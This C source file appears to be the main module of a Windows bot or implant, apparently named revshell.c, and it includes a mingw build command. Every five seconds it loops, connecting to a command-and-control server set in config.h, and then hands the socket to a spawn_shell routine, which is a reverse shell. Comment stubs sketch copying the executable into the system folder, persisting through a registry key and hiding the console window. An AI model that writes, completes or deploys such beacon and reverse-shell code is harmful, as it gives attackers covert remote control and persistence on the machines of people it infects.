#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "config.h"
#include "modules.h"
#include "botmain.h"

/* IMPORTANT: need to link with ws2_32 (i686-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32) */

int main(int argc, char* argv[])
{
  /* init: copy exe to system folder */

  /* persist with reg key */

  /* FreeConsole(); */
  beacon();
}

/* continually beacon the C2 (add random interval) */
void beacon()
{
  SOCKET sock;
  struct sockaddr_in server;
  char msg_buffer[1024]= {0};
  int recv_size;
  WSADATA wsa;

  while (1)
    {
      Sleep(5000);
      
      /* initialize win sock version*/
      if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	exit(0);
      
      if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
			   NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
	{
	  server.sin_addr.s_addr= inet_addr(C2SERVER);
	  server.sin_family= AF_INET;
	  server.sin_port= htons(C2PORT);

	  printf("sock created\n");
	  
	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
	      != SOCKET_ERROR)
	    {
	      printf("connected\n");
	      /* get data from C2 before continuing (add config)*/
	      if ((recv_size= recv(sock, msg_buffer, 1024, 0)) != SOCKET_ERROR)
		{
		  spawn_shell((HANDLE)sock);
		}
	    }
	}

      WSACleanup();
      closesocket(sock);
      printf("11. loop end\n");
    }
}


